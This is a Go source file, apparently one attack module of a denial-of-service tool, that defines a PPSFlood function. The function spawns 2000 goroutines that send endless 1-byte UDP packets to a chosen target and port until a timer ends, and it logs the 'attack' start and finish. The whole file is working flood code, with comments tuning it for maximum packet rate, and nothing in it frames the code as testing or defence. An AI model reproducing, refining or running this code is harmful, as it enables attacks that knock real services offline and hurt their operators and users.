package methods

import (
	"context"
	"fmt"
	"net"
	"time"
)

// PPSFlood - High Packets Per Second UDP Flood (Small payloads)
func PPSFlood(ctx context.Context, target string, port string, sec int) {
	fmt.Printf("[%s] PPS Attack started on %s:%s for %ds\n",
		time.Now().Format("15:04:05"), target, port, sec)

	payload := []byte("x") // 1 byte payload for max PPS

	// Optimized worker count for PPS (Reduced thread contention, optimized loop)
	for i := 0; i < 2000; i++ {
		go func() {
			address := net.JoinHostPort(target, port)

			// UDP is connectionless, but Dial creates a "connected" socket object
			// for repeatedly sending to the same address.
			conn, err := net.Dial("udp", address)
			if err != nil {
				return
			}
			defer conn.Close()

			// Send loop - Optimized: Check time only every 10000 packets
			// checking time.Now() every packet is a massive bottleneck (syscall overhead)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				for i := 0; i < 10000; i++ {
					conn.Write(payload)
				}
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] PPS Attack finished.\n", time.Now().Format("15:04:05"))
}
